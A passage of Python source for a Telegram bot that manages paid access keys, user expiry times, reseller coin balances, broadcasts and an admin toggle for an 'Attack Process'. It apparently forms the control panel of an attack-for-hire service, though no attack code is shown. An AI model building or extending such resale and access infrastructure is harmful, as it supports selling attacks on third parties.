                f"🔴 𝗨𝘀𝗲𝗱: `{key}`\n"
                f"𝗥𝗲𝗱𝗲𝗲𝗺𝗲𝗱 𝗕𝘆: {redeemed_by}\n"
                f"𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: {expiration if expiration else 'N/A'}\n\n"
            )
        else:  # Unused key
            key_list.append(
                f"🟢 𝗨𝗻𝘂𝘀𝗲𝗱: `{key}`\n"
                f"{'𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻' if expiration else '𝗩𝗮𝗹𝗶𝗱𝗶𝘁𝘆'}: "
                f"{expiration if expiration else format_validity(validity)}\n\n"
            )

    # Send messages in chunks of 4096 characters
    key_list_str = "".join(key_list)
    for i in range(0, len(key_list_str), 4096):
        chunk = key_list_str[i:i + 4096].strip()
        if chunk:
            bot.send_message(message.chat.id, chunk, parse_mode='Markdown')
            

@bot.message_handler(commands=['users'])
def show_users_command(message):
    if str(message.chat.id) not in admin_id:
        return bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱")

    if not users:
        return bot.reply_to(message, "𝗡𝗼 𝘂𝘀𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱")

    user_list = "𝗨𝘀𝗲𝗿𝘀:\n\n"
    for user_id, expiration in users.items():
        expiration_time = datetime.datetime.strptime(expiration, '%Y-%m-%d %H:%M:%S')
        status = "Active 🟢" if expiration_time > datetime.datetime.now() else "Inactive 🔴"
        user_list += f"𝗨𝘀𝗲𝗿 𝗜𝗗: `{user_id}`\n"
        user_list += f"𝗘𝘅𝗽𝗶𝗿𝗮𝘁𝗶𝗼𝗻: `{convert_utc_to_ist(expiration)}`\n"
        user_list += f"𝗦𝘁𝗮𝘁𝘂𝘀: `{status}`\n\n"

    bot.send_message(message.chat.id, user_list, parse_mode="Markdown")
    

@bot.message_handler(commands=['remove'])
def remove_user(message):
    # Only allow admins to remove users
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆")
        return

    # Extract the user ID from the command
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /remove <𝘂𝘀𝗲𝗿_𝗶𝗱>")
        return

    user_to_remove = command_parts[1].strip()

    if user_to_remove in users:
        # Find and delete the user's key from keys.json
        key_to_delete = None
        for key, data in keys.items():
            if data.get("redeemed_by") == user_to_remove:
                key_to_delete = key
                break

        if key_to_delete:
            del keys[key_to_delete]
            save_keys()

        # Remove the user from users.json
        del users[user_to_remove]
        save_users()

        if key_to_delete:
            bot.reply_to(
                message,
                f"✅ 𝗨𝘀𝗲𝗿 {user_to_remove} 𝗮𝗻𝗱 𝗵𝗶𝘀 𝗸𝗲𝘆 {key_to_delete} 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱.",
            )
        else:
            bot.reply_to(message, f"✅ 𝗨𝘀𝗲𝗿 {user_to_remove} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱.")

    else:
        bot.reply_to(message, "📛 𝗨𝘀𝗲𝗿 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 📛")
        
@bot.message_handler(commands=['delete'])
def delete_key(message):
    # Only allow admins to delete keys
    user_id = str(message.chat.id)

    if user_id not in admin_id:
        bot.reply_to(message, "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆")
        return

    # Extract the key from the command
    command_parts = message.text.split(maxsplit=1)
    if len(command_parts) < 2:
        bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /delete <𝗸𝗲𝘆>")
        return

    key_to_delete = command_parts[1].strip()

    if key_to_delete in keys:
        # Check if the key was redeemed
        redeemed_by = keys[key_to_delete].get("redeemed_by")

        # Delete the key
        del keys[key_to_delete]
        save_keys()

        # If the key was redeemed, remove the user from users.json
        if redeemed_by and redeemed_by in users:
            del users[redeemed_by]
            save_users()
            bot.reply_to(message, f"✅ 𝗞𝗲𝘆 {key_to_delete} 𝗮𝗻𝗱 𝗨𝘀𝗲𝗿 {redeemed_by} 𝗵𝗮𝘃𝗲 𝗯𝗲𝗲𝗻 𝗿𝗲𝗺𝗼𝘃𝗲𝗱.")
        else:
            bot.reply_to(message, f"✅ 𝗞𝗲𝘆 {key_to_delete} 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗱𝗲𝗹𝗲𝘁𝗲𝗱.")

    else:
        bot.reply_to(message, "📛 𝗞𝗲𝘆 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 📛")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ ADMIN PANEL SETTINGS ]------------------
        
@bot.message_handler(func=lambda message: message.text == "Add User")
def add_user_command(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return
        
    bot.send_message(message.chat.id, "*Please enter the User ID:*", parse_mode='Markdown')
    bot.register_next_step_handler(message, ask_duration_unit)

def ask_duration_unit(message):
    user_id = message.text.strip()
    
    # Store user ID temporarily
    bot_data[message.chat.id] = {"user_id": user_id}

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(types.InlineKeyboardButton("Days", callback_data="days"))
    markup.add(types.InlineKeyboardButton("Hours", callback_data="hours"))

    bot.send_message(message.chat.id, "⏳ *Choose an option:*", reply_markup=markup, parse_mode='Markdown')
    
@bot.callback_query_handler(func=lambda call: call.data in ["days", "hours"])
def ask_duration(call):
    bot.answer_callback_query(call.id)

    chat_id = call.message.chat.id
    time_unit = "days" if call.data == "days" else "hours"

    # Store the selected time unit
    bot_data[chat_id]["time_unit"] = time_unit

    # Edit the message to ask for the number of days/hours
    bot.edit_message_text(
        chat_id=chat_id, 
        message_id=call.message.message_id, 
        text=f"*Enter the number of {time_unit}:*", parse_mode='Markdown')

    bot.register_next_step_handler(call.message, add_user_access)

def add_user_access(message):
    chat_id = message.chat.id
    user_data = bot_data.get(chat_id, {})

    if "user_id" not in user_data or "time_unit" not in user_data:
        bot.send_message(chat_id, "⚠️ 𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝘀𝘁𝗮𝗿𝘁 𝘁𝗵𝗲 𝗽𝗿𝗼𝗰𝗲𝘀𝘀..")
        return

    user_id = user_data["user_id"]
    time_unit = user_data["time_unit"]

    try:
        duration_value = int(message.text.strip())

        if time_unit == "days":
            duration_in_hours = duration_value * 24
        else:
            duration_in_hours = duration_value

        expiration_time = datetime.datetime.now() + datetime.timedelta(hours=duration_in_hours)
        users[user_id] = expiration_time.strftime('%Y-%m-%d %H:%M:%S')
        save_users()

        bot.send_message(chat_id, f"✅ 𝗨𝘀𝗲𝗿 *{user_id}* 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 𝗴𝗿𝗮𝗻𝘁𝗲𝗱 𝗮𝗰𝗰𝗲𝘀𝘀 𝗳𝗼𝗿 *{duration_value}* *{time_unit}*!", parse_mode='Markdown')
    
    except ValueError:
        bot.send_message(chat_id, "❗ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗶𝗻𝗽𝘂𝘁!")
              
@bot.message_handler(func=lambda message: message.text == "Controll Access")
def show_modify_options(message):
    if str(message.chat.id) not in admin_id:
        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱")
        return

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("⬆️ Increase Access", callback_data="increase_access"),
        types.InlineKeyboardButton("⬇️ Decrease Access", callback_data="decrease_access")
    )
    
    bot.send_message(message.chat.id, "🔹 *Choose an action:*", reply_markup=markup, parse_mode='Markdown')
    
@bot.callback_query_handler(func=lambda call: call.data in ["increase_access", "decrease_access"])
def ask_user_id(call):
    bot.answer_callback_query(call.id)
    
    chat_id = call.message.chat.id
    action = "Increase" if call.data == "increase_access" else "Decrease"

    admin_sessions[chat_id] = {"action": call.data}  # Store action type

    # Edit message to remove buttons and update text
    bot.edit_message_text(
        chat_id=chat_id,
        message_id=call.message.message_id,
        text=f"✅ *Selected: {action} Access*\n*Enter the User ID:*", parse_mode='Markdown'
    )

    bot.register_next_step_handler(call.message, ask_time_unit)
    
def ask_time_unit(message):
    chat_id = message.chat.id
    user_id = message.text.strip()

    # Validate if user exists
    if user_id not in users:
        bot.reply_to(message, f"❌ 𝗨𝘀𝗲𝗿 {user_id} 𝗻𝗼𝘁 𝗳𝗼𝘂𝗻𝗱 𝗼𝗿 𝗵𝗮𝘀 𝗻𝗼 𝗮𝗰𝘁𝗶𝘃𝗲 𝗮𝗰𝗰𝗲𝘀𝘀.")
        return

    admin_sessions[chat_id]["user_id"] = user_id

    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("Days", callback_data="time_days"),
        types.InlineKeyboardButton("Hours", callback_data="time_hours")
    )

    bot.send_message(chat_id, "⏳ *Choose an option:*", reply_markup=markup, parse_mode='Markdown')
    
@bot.callback_query_handler(func=lambda call: call.data in ["time_days", "time_hours"])
def ask_durations(call):
    bot.answer_callback_query(call.id)

    chat_id = call.message.chat.id
    time_unit = "days" if call.data == "time_days" else "hours"

    # Store the selected time unit
    admin_sessions[chat_id]["time_unit"] = time_unit

    # Edit the message to ask for the number of days/hours
    bot.edit_message_text(
        chat_id=chat_id, 
        message_id=call.message.message_id, 
        text=f"*Enter the number of {time_unit}:*", parse_mode='Markdown'
    )

    bot.register_next_step_handler(call.message, process_duration)

def process_duration(message):
    chat_id = message.chat.id
    session = admin_sessions.get(chat_id, {})

    if "user_id" not in session or "action" not in session or "time_unit" not in session:
        bot.send_message(chat_id, "⚠️ 𝗔𝗻 𝗲𝗿𝗿𝗼𝗿 𝗼𝗰𝗰𝘂𝗿𝗿𝗲𝗱. 𝗣𝗹𝗲𝗮𝘀𝗲 𝗿𝗲𝘀𝘁𝗮𝗿𝘁 𝘁𝗵𝗲 𝗽𝗿𝗼𝗰𝗲𝘀𝘀.")
        return

    user_id = session["user_id"]
    action = session["action"]
    time_unit = session["time_unit"]

    try:
        duration_value = int(message.text.strip())

        if time_unit == "days":
            duration_in_hours = duration_value * 24
        else:
            duration_in_hours = duration_value

        # Get current expiration time
        current_expiry = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S')

        if action == "increase_access":
            new_expiry = current_expiry + datetime.timedelta(hours=duration_in_hours)
            change_type = "𝗲𝘅𝘁𝗲𝗻𝗱𝗲𝗱"
        else:  # Decrease case
            new_expiry = current_expiry - datetime.timedelta(hours=duration_in_hours)
            change_type = "𝗿𝗲𝗱𝘂𝗰𝗲𝗱"

        # Prevent negative expiration
        if new_expiry < datetime.datetime.now():
            bot.reply_to(message, f"⚠️ 𝗨𝘀𝗲𝗿 {user_id}'𝘀 𝗮𝗰𝗰𝗲𝘀𝘀 𝗰𝗮𝗻𝗻𝗼𝘁 𝗯𝗲 𝗿𝗲𝗱𝘂𝗰𝗲𝗱 𝗳𝘂𝗿𝘁𝗵𝗲𝗿!")
            return

        # Update user's expiration time
        users[user_id] = new_expiry.strftime('%Y-%m-%d %H:%M:%S')
        save_users()

        # Update the redeemed key's expiration time
        for key, key_data in keys.items():
            if key_data.get("redeemed_by") == user_id and key_data["status"] == "used":
                key_data["expiration"] = new_expiry.strftime('%Y-%m-%d %H:%M:%S')
                save_keys()
                break  # Stop after updating the first matched key

        # Notify Admin
        bot.reply_to(message, f"✅ 𝗨𝘀𝗲𝗿 {user_id}'𝘀 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 {change_type} 𝗯𝘆 {duration_value} {time_unit}.\n"
                              f"📅 𝗡𝗲𝘄 𝗘𝘅𝗽𝗶𝗿𝘆: {convert_utc_to_ist(users[user_id])}")

        # Notify User
        bot.send_message(user_id, f"🔔 𝗬𝗼𝘂𝗿 𝗮𝗰𝗰𝗲𝘀𝘀 𝗵𝗮𝘀 𝗯𝗲𝗲𝗻 {change_type} 𝗯𝘆 {duration_value} {time_unit}.\n"
                                  f"📅 𝗡𝗲𝘄 𝗘𝘅𝗽𝗶𝗿𝘆: {convert_utc_to_ist(users[user_id])}")

    except ValueError:
        bot.reply_to(message, "𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗶𝗻𝗽𝘂𝘁!")
        
# --------------------------------------------------------------
        

        
        
        
# --------------------[ RESELLERS PANEL SETTINGS ]------------------
        
@bot.message_handler(commands=['addreseller'])
def add_reseller_command(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        try:
            parts = message.text.split()
            if len(parts) != 3:
                raise ValueError("Invalid format")

            reseller_id, initial_coins = parts[1], int(parts[2])

            if reseller_id in resellers:
                bot.send_message(message.chat.id, f"❗ 𝗨𝘀𝗲𝗿 {reseller_id} 𝗶𝘀 𝗮𝗹𝗿𝗲𝗮𝗱𝘆 𝗮 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿.", parse_mode="Markdown")
                return

            if initial_coins < 0:
                raise ValueError("Negative coins not allowed")

            resellers[reseller_id] = {"coins": initial_coins}
            save_resellers()

            bot.send_message(message.chat.id, f"✅ 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗮𝗱𝗱𝗲𝗱 𝘄𝗶𝘁𝗵 {initial_coins} 𝗰𝗼𝗶𝗻𝘀.", parse_mode="Markdown")
        except ValueError:
            bot.send_message(message.chat.id, "𝗨𝘀𝗲: `/addreseller <user_id> <coins>`", parse_mode="Markdown")
    else:
        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.")

@bot.message_handler(commands=['removereseller'])
def remove_reseller_command(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        try:
            parts = message.text.split()
            if len(parts) != 2:
                raise ValueError("Invalid format")

            reseller_id = parts[1]

            if reseller_id in resellers:
                del resellers[reseller_id]
                save_resellers()
                bot.send_message(message.chat.id, f"✅ 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗿𝗲𝗺𝗼𝘃𝗲𝗱 𝘀𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆.", parse_mode="Markdown")
            else:
                bot.send_message(message.chat.id, f"❗ 𝗨𝘀𝗲𝗿 {reseller_id} 𝗶𝘀 𝗻𝗼𝘁 𝗮 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿.", parse_mode="Markdown")
        except ValueError:
            bot.send_message(message.chat.id, "𝗨𝘀𝗲: `/removereseller <user_id>`", parse_mode="Markdown")
    else:
        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.")

@bot.message_handler(commands=['addcoins'])
def add_coins_command(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        try:
            parts = message.text.split()
            if len(parts) != 3:
                raise ValueError("Invalid format")

            reseller_id, amount = parts[1], int(parts[2])

            if reseller_id not in resellers:
                bot.send_message(message.chat.id, f"❗ 𝗨𝘀𝗲𝗿 {reseller_id} 𝗶𝘀 𝗻𝗼𝘁 𝗮 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿.", parse_mode="Markdown")
                return

            if amount < 0:
                raise ValueError("Negative coins not allowed")

            resellers[reseller_id]["coins"] += amount
            save_resellers()

            bot.send_message(message.chat.id, f"✅ 𝗔𝗱𝗱𝗲𝗱 {amount} 𝗰𝗼𝗶𝗻𝘀\n 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿: {reseller_id}\n 𝗡𝗲𝘄 𝗯𝗮𝗹𝗮𝗻𝗰𝗲: {resellers[reseller_id]['coins']} 𝗰𝗼𝗶𝗻𝘀.", parse_mode="Markdown")
        except ValueError:
            bot.send_message(message.chat.id, "𝗨𝘀𝗲: `/addcoins <user_id> <amount>`", parse_mode="Markdown")
    else:
        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱.")

@bot.message_handler(commands=['deductcoins'])
def deduct_coins_command(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        try:
            parts = message.text.split()
            if len(parts) != 3:
                raise ValueError("Invalid format")

            reseller_id, amount = parts[1], int(parts[2])

            if reseller_id not in resellers:
                bot.send_message(message.chat.id, f"❗ 𝗨𝘀𝗲𝗿 {reseller_id} 𝗶𝘀 𝗻𝗼𝘁 𝗮 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿.", parse_mode="Markdown")
                return

            if amount < 0:
                raise ValueError("Negative coins not allowed")

            if resellers[reseller_id]["coins"] < amount:
                bot.send_message(message.chat.id, f"❗ 𝗜𝗻𝘀𝘂𝗳𝗳𝗶𝗰𝗶𝗲𝗻𝘁 𝗰𝗼𝗶𝗻𝘀! 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id} 𝗵𝗮𝘀 𝗼𝗻𝗹𝘆 {resellers[reseller_id]['coins']} 𝗰𝗼𝗶𝗻𝘀.", parse_mode="Markdown")
                return

            resellers[reseller_id]["coins"] -= amount
            save_resellers()

            bot.send_message(message.chat.id, f"✅ 𝗗𝗲𝗱𝘂𝗰𝘁𝗲𝗱 {amount} 𝗰𝗼𝗶𝗻𝘀 𝗳𝗿𝗼𝗺 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 {reseller_id}.\n🆕 𝗡𝗲𝘄 𝗯𝗮𝗹𝗮𝗻𝗰𝗲: {resellers[reseller_id]['coins']} 𝗰𝗼𝗶𝗻𝘀.", parse_mode="Markdown")
        except ValueError:
            bot.send_message(message.chat.id, "𝗨𝘀𝗲: `/deductcoins <user_id> <amount>`", parse_mode="Markdown")
    else:
        bot.reply_to(message, "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        
@bot.message_handler(func=lambda message: message.text == "Balance")
def check_balance_command(message):
    user_id = str(message.chat.id)

    if user_id in admin_id:
        # If the user is an admin, show all resellers and their balances
        if not resellers:
            response = "ℹ️ 𝗡𝗼 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿𝘀 𝗳𝗼𝘂𝗻𝗱"
        else:
            response = "📜 𝗥𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗕𝗮𝗹𝗮𝗻𝗰𝗲𝘀:\n"
            for reseller, data in resellers.items():
                response += f"👤 `{reseller}` → 💰 {data['coins']} 𝗰𝗼𝗶𝗻𝘀\n"
    elif user_id in resellers:
        # If the user is a reseller, show their own balance
        balance = resellers[user_id]['coins']
        response = f"💰 𝗬𝗼𝘂𝗿 𝗕𝗮𝗹𝗮𝗻𝗰𝗲: {balance} 𝗰𝗼𝗶𝗻𝘀"
    else:
        # If the user is neither an admin nor a reseller, deny access
        response = "⛔ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮 𝗿𝗲𝘀𝗲𝗹𝗹𝗲𝗿 𝗼𝗿 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻."

    bot.send_message(message.chat.id, response, parse_mode="Markdown")
    
# ------------------------------------------------------------
        

        
        
        
# --------------------[ BROADCAST SETTINGS ]------------------

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)

    if user_id not in admin_id:  # Admin check
        response = "⛔️ 𝗔𝗰𝗰𝗲𝘀𝘀 𝗗𝗲𝗻𝗶𝗲𝗱: 𝗔𝗱𝗺𝗶𝗻 𝗼𝗻𝗹𝘆 𝗰𝗼𝗺𝗺𝗮𝗻𝗱"
        bot.reply_to(message, response)
        return

    msg_parts = message.text.split(" ", 2)

    if len(msg_parts) == 3:  # Targeted message
        target_user_id = msg_parts[1]
        broadcast_message = msg_parts[2]

        if not target_user_id.isdigit():  # Validate user ID
            response = "❗️𝗘𝗿𝗿𝗼𝗿: 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝘂𝘀𝗲𝗿 𝗜𝗗."
            bot.reply_to(message, response)
            return

        try:
            bot.send_message(int(target_user_id), broadcast_message)
            response = f"📤 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝘀𝗲𝗻𝘁 𝘁𝗼 𝘂𝘀𝗲𝗿 {target_user_id}."
        except Exception as e:
            response = f"❗️𝗘𝗿𝗿𝗼𝗿: 𝗙𝗮𝗶𝗹𝗲𝗱 𝘁𝗼 𝘀𝗲𝗻𝗱 𝗺𝗲𝘀𝘀𝗮𝗴𝗲. {str(e)}"

        bot.reply_to(message, response)
    
    elif len(msg_parts) == 1:  # No message provided, ask admin for input
        pending_broadcasts[user_id] = True
        bot.reply_to(message, "📢 𝗦𝗲𝗻𝗱 𝘆𝗼𝘂𝗿 𝗺𝗲𝘀𝘀𝗮𝗴𝗲 𝘁𝗼 𝗯𝗿𝗼𝗮𝗱𝗰𝗮𝘀𝘁 𝘁𝗼 𝗮𝗹𝗹 𝘂𝘀𝗲𝗿𝘀.")

@bot.message_handler(func=lambda message: str(message.chat.id) in pending_broadcasts)
def handle_broadcast_response(message):
    user_id = str(message.chat.id)

    if user_id in pending_broadcasts:
        broadcast_message = message.text
        del pending_broadcasts[user_id]  # Remove pending state

        for user in users:
            try:
                bot.send_message(int(user), broadcast_message)
            except Exception as e:
                print(f"Failed to send message to {user}: {e}")

        response = "📤 𝗠𝗲𝘀𝘀𝗮𝗴𝗲 𝘀𝗲𝗻𝘁 𝘁𝗼 𝗮𝗹𝗹 𝘂𝘀𝗲𝗿𝘀."

    bot.reply_to(message, response)
    
# ------------------------------------------------------------
        

        
        
        
# --------------------[ CREDIT SETTINGS ]------------------
    
    
@bot.message_handler(commands=['credit'])
def credit_binary(message):
    """Admin command to change the credit name."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            new_credit = message.text.split()[1].strip()
            # Ensure the name is one word (no spaces)
            if " " in new_credit or not new_credit.isalnum():
                bot.reply_to(message, "⚠️ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝗮𝗺𝗲!")
                return
            global credit
            credit = new_credit
            save_config()  # Save changes
            bot.reply_to(message, f"✅ 𝗖𝗿𝗲𝗱𝗶𝘁 𝗻𝗮𝗺𝗲 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: *{new_credit}*", parse_mode='Markdown')
        except IndexError:
            bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /credit <new_name>")
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

@bot.message_handler(commands=['prefix'])
def set_prefix(message):
    """Admin command to change the key prefix name."""
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            new_prefix = message.text.split()[1].strip()
            # Ensure the name is one word (no spaces)
            if " " in new_prefix or not new_prefix.isalnum():
                bot.reply_to(message, "⚠️ 𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗻𝗮𝗺𝗲!")
                return
            global key_prefix
            key_prefix = new_prefix
            save_config()  # Save changes
            bot.reply_to(message, f"✅ 𝗞𝗲𝘆 𝗽𝗿𝗲𝗳𝗶𝘅 𝗻𝗮𝗺𝗲 𝗰𝗵𝗮𝗻𝗴𝗲𝗱 𝘁𝗼: *{new_prefix}*", parse_mode='Markdown')
        except IndexError:
            bot.reply_to(message, "𝗨𝘀𝗮𝗴𝗲: /prefix <new_name>")
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        

@bot.message_handler(func=lambda message: message.text == "Attack Process")
def set_attack_process(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        keyboard = types.InlineKeyboardMarkup()
        keyboard.add(
            types.InlineKeyboardButton("✅ Active", callback_data="process_active"),
            types.InlineKeyboardButton("🅾️ Inactive", callback_data="process_inactive")
        )
        bot.reply_to(message, f"𝗖𝗵𝗼𝗼𝘀𝗲 𝘆𝗼𝘂𝗿 𝗼𝗽𝘁𝗶𝗼𝗻𝘀:", reply_markup=keyboard)
    else:
        bot.reply_to(message, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")

@bot.callback_query_handler(func=lambda call: call.data.startswith("process_"))
def handle_process_callback(call):
    user_id = str(call.message.chat.id)
    if user_id not in admin_id:
        bot.answer_callback_query(call.id, "⛔️ 𝗬𝗼𝘂 𝗮𝗿𝗲 𝗻𝗼𝘁 𝗮𝗻 𝗮𝗱𝗺𝗶𝗻.")
        return
    
    global ATTACK_PROCESS
    if call.data == "process_active":
        ATTACK_PROCESS = "Active"
    elif call.data == "process_inactive":
        ATTACK_PROCESS = "Inactive"

    save_config()  # Save the updated status
    ATTACK_PROCESS_STATUS = "𝗔𝗰𝘁𝗶𝘃𝗲 ✅" if ATTACK_PROCESS == "Active" else "𝗜𝗻𝗮𝗰𝘁𝗶𝘃𝗲 🅾️"
    
    # Edit the original message with the updated status
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=f"𝗔𝘁𝘁𝗮𝗰𝗸 𝗶𝗻 𝗽𝗿𝗼𝗰𝗲𝘀𝘀 𝘀𝘁𝗮𝘁𝘂𝘀 𝗶𝘀 {ATTACK_PROCESS_STATUS}")
        
    

if __name__ == "__main__":
    print("✅ Bot is active!... ")
    while True:
        load_data()
        try:
            bot.polling(none_stop=True, interval=0.5, timeout=10, long_polling_timeout=5)
        except Exception as e:
            print(e)
        